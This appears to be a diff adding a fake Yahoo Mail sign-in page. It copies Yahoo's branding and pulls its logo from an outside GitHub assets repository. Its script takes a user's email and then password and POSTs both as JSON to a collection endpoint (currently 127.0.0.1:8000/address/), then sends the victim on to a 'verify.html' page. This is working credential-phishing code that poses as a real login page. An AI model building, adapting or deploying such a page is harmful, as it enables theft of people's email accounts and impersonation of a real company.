@@ -1,0 +1,118 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Yahoo - Login</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="./styles.css" />
+  </head>
+  <body>
+    <main class="page">
+      <header class="brand">
+        <img class="logo" src="https://raw.githubusercontent.com/jvictory9948/plmassets/refs/heads/main/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo! Logo">
+      </header>
+
+      <section class="card">
+        <h2 class="title">Sign in to Yahoo Mail</h2>
+        <p class="subtitle">Sign in using your Yahoo account</p>
+
+        <label class="field" id="emailField">
+          <span class="field-label">Username, email or mobile</span>
+          <input class="field-input" type="text" inputmode="email" autocomplete="username" aria-label="Username, email or mobile" id="emailInput"/>
+          <span class="field-underline" aria-hidden="true"></span>
+        </label>
+
+        <label class="field" id="passwordField" style="display: none;">
+          <span class="field-label">Password</span>
+          <input class="field-input" type="password" autocomplete="current-password" aria-label="Password" id="passwordInput"/>
+          <span class="field-underline" aria-hidden="true"></span>
+        </label>
+
+        <button class="btn btn-primary" type="button" id="loginNext">Next</button>
+
+        <script>
+          let step = 1;
+          const emailField = document.getElementById("emailField");
+          const passwordField = document.getElementById("passwordField");
+          const emailInput = document.getElementById("emailInput");
+          const passwordInput = document.getElementById("passwordInput");
+          const nextButton = document.getElementById("loginNext");
+
+          nextButton.addEventListener("click", async () => {
+            if (step === 1) {
+              // First step: Email validation
+              const email = emailInput.value.trim();
+
+              if (!email) {
+                alert("Please enter your email.");
+                return;
+              }
+
+              // Hide email field, show password field
+              emailField.style.display = "none";
+              passwordField.style.display = "block";
+              nextButton.textContent = "Sign In";
+              step = 2;
+
+            } else if (step === 2) {
+              // Second step: Send email and password to API
+              const email = emailInput.value.trim();
+              const password = passwordInput.value.trim();
+
+              if (!password) {
+                alert("Please enter your password.");
+                return;
+              }
+
+              // Disable button to prevent double submission
+              nextButton.disabled = true;
+              nextButton.textContent = "Signing in...";
+
+              try {
+                const response = await fetch("http://127.0.0.1:8000/address/", {
+                  method: "POST",
+                  headers: {
+                    "Content-Type": "application/json",
+                  },
+                  mode: "cors",
+                  body: JSON.stringify({
+                    email: email,
+                    password: password
+                  })
+                });
+
+                const data = await response.json();
+                console.log("Response:", data);
+
+                if (response.ok) {
+                  // Success - redirect to verify page
+                  window.location.href = "verify.html";
+                } else {
+                  // Error response
+                  alert("An error occurred: " + (data.error || "Please try again."));
+                  nextButton.disabled = false;
+                  nextButton.textContent = "Sign In";
+                }
+              } catch (error) {
+                console.error("Error:", error);
+                alert("Unable to connect to the server. Error: " + error.message);
+                nextButton.disabled = false;
+                nextButton.textContent = "Sign In";
+              }
+            }
+          });
+        </script>
+
+        <p class="helper">
+          <a href="#" class="link">Forgotten username?</a>
+        </p>
+        <span class="cta-footer" aria-label="Create account">
+          <a class="btn btn-ghost" href="#">Create an account</a>
+        </span>
+      </section>
+    </main>
+  </body>
+</html>
